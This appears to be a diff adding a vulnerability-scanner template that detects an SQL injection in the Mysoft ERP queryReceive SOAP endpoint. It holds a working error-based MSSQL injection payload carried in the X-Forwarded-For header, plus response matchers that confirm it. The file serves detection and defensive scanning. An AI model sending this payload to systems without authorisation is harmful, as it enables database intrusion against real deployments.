@@ -1,0 +1,50 @@
+id: mysoft-erp-queryreceive-xffi
+
+info:
+  name: Mysoft ERP queryReceive X-Forwarded-For SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in the Mysoft ERP queryReceive endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /Kfxt/Service.asmx HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1') AND 1234 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))-- +
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://www.mysoft.com.cn/queryReceive"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <queryReceive xmlns="http://www.mysoft.com.cn/">
+              <inpXML><xml><buname>abc</buname></xml></inpXML>
+            </queryReceive>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "queryReceiveResponse"
+          - "转换成数据类型 int 时失败"
+          - "在将 nvarchar 值"
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"
